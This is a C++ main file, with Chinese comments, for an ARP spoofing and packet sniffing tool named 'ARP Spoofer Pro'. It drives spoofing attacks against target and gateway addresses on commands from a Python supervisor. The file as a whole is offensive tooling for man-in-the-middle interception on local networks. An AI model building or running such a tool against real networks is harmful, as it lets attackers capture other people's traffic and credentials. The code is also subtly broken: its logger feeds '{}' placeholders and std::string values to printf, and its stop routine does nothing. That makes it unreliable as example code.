#include <iostream>
#include <signal.h>
#include <thread>
#include <memory>
#include <chrono>
#include <atomic>
#include <vector>
#include "packet_sniffer.h"
#include "arp_spoofer.h"
#include "ipc_manager.h"
#include "utils.h"
#include "config_manager.h"
#include "object_pool.h"

// ★【简化】★ 使用简单的日志类而不是spdlog
class SimpleLogger {
public:
    template<typename... Args>
    void info(const std::string& format, Args... args) {
        printf("[INFO] ");
        printf(format.c_str(), args...);
        printf("\n");
    }
    
    template<typename... Args>
    void warn(const std::string& format, Args... args) {
        printf("[WARN] ");
        printf(format.c_str(), args...);
        printf("\n");
    }
    
    template<typename... Args>
    void error(const std::string& format, Args... args) {
        printf("[ERROR] ");
        printf(format.c_str(), args...);
        printf("\n");
    }
};

// 全局原子变量，用于优雅停机
static std::atomic<bool> g_running(true);

void signal_handler(int signum) {
    std::cout << "\n[Main] Signal received: " << signum << ". Shutting down..." << std::endl;
    g_running = false;
}

class ARPSpooferCore {
private:
    std::unique_ptr<ConfigManager> config_;
    std::unique_ptr<IPCManager> ipc_; // ★ 唯一的IPC管理器
    std::unique_ptr<PacketSniffer> sniffer_;
    std::unique_ptr<ARPSpoofer> spoofer_;
    
    std::string interface_;
    std::atomic<bool>& running_flag_;

    // ★【新增】★ 日志器
    std::unique_ptr<SimpleLogger> logger_;

    // ★【新增】★ 性能统计
    std::thread monitoring_thread_;
    std::chrono::steady_clock::time_point start_time_;

public:
    ARPSpooferCore(const std::string& iface, std::atomic<bool>& running_flag)
        : interface_(iface), running_flag_(running_flag) {
        // ★【新增】★ 初始化简单日志器
        logger_ = std::make_unique<SimpleLogger>();
    }

    ~ARPSpooferCore() {
        stop();
    }

    bool initialize() {
        std::cout << "[C++ Core] Initializing ARP Spoofer Pro..." << std::endl;

        if (!check_root_privileges()) {
            std::cerr << "[ERROR] This program requires root privileges!" << std::endl;
            return false;
        }

        try {
            // 1. 加载配置
            config_ = std::make_unique<ConfigManager>("../config/config.yaml");
            if (!config_->load_config()) {
                std::cerr << "[WARNING] Failed to load config, using defaults." << std::endl;
            }
            config_->start_monitoring();

            // 2. ★【重构】★ 初始化唯一的IPC管理器，构造函数处理所有设置
            ipc_ = std::make_unique<IPCManager>(*config_);

            // 3. 设置连接丢失回调
            ipc_->set_connection_lost_callback([this]() {
                std::cerr << "[ERROR] Lost connection to Python supervisor! Shutting down." << std::endl;
                this->running_flag_ = false;
            });

            // 4. 初始化其他核心组件
            spoofer_ = std::make_unique<ARPSpoofer>(interface_);
            sniffer_ = std::make_unique<PacketSniffer>(interface_, ipc_.get());

            if (!sniffer_->initialize() || !spoofer_->initialize()) {
                std::cerr << "[ERROR] Failed to initialize sniffer or spoofer!" << std::endl;
                return false;
            }

        } catch (const std::exception& e) {
            std::cerr << "[ERROR] Initialization failed during constructor: " << e.what() << std::endl;
            return false;
        }

        std::cout << "[C++ Core] Core modules initialized successfully." << std::endl;
        std::cout << utils::get_system_info() << std::endl; // ★【修复】★ 调用正确的函数名
        return true;
    }

    void run() {
        std::cout << "[C++ Core] Starting main loop..." << std::endl;
        start_time_ = std::chrono::steady_clock::now();

        // 启动嗅探线程
        std::thread sniffer_thread([this]() {
            sniffer_->start_sniffing();  // ★【修复】★ 移除参数
        });

        // 主循环只处理来自Python的命令
        while (running_flag_) {
            auto command = ipc_->receive_command(1000); // 等待1秒
            if (command) {
                process_command(*command);
            }
            // 心跳检查由IPCManager内部线程自动处理
        }

        std::cout << "[C++ Core] Main loop finished. Waiting for threads to join..." << std::endl;
        if (sniffer_thread.joinable()) {
            sniffer_thread.join();
        }
    }

    void stop() {
        std::cout << "[C++ Core] Stopping all components..." << std::endl;
        // IPCManager的析构函数会自动处理其线程和sockets的关闭
        // Sniffer和Spoofer的析构函数也会自动清理资源
    }

private:
    void process_command(const IPCCommand& cmd) {
        // ★【修复】★ 使用枚举类型比较而不是字符串
        if (cmd.type == CommandType::START_SPOOF) {
            // ★【修复】★ 调用正确的函数签名
            spoofer_->start_spoofing(cmd.target_ip, cmd.gateway_ip, cmd.target_mac, cmd.gateway_mac, cmd.duration, cmd.attack_type);
        } else if (cmd.type == CommandType::RESTORE_ARP) {
            // ★【修复】★ 提供所有需要的参数
            if (!cmd.target_mac.empty() && !cmd.gateway_mac.empty()) {
                spoofer_->restore_arp(cmd.target_ip, cmd.gateway_ip, cmd.target_mac, cmd.gateway_mac);
            } else {
                logger_->warn("Cannot restore ARP, MAC addresses missing for IP: {}", cmd.target_ip);
            }
        } else if (cmd.type == CommandType::SHUTDOWN) {
            logger_->info("Shutdown command received, initiating graceful shutdown...");
            running_flag_.store(false);
        } else {
            std::cerr << "[Command] Received unknown command type." << std::endl;
        }
    }
};

int main(int argc, char* argv[]) {
    if (argc != 2) {
        std::cerr << "Usage: " << argv[0] << " <network_interface>" << std::endl;
        return 1;
    }

    // 设置信号处理器
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);

    try {
        ARPSpooferCore core(argv[1], g_running);

        if (!core.initialize()) {
            std::cerr << "[Main] Core initialization failed. Exiting." << std::endl;
            return 1;
        }

        core.run();

    } catch (const std::exception& e) {
        std::cerr << "[Main] An unhandled exception occurred: " << e.what() << std::endl;
        return 1;
    }

    std::cout << "[Main] Application terminated gracefully." << std::endl;
    return 0;
}
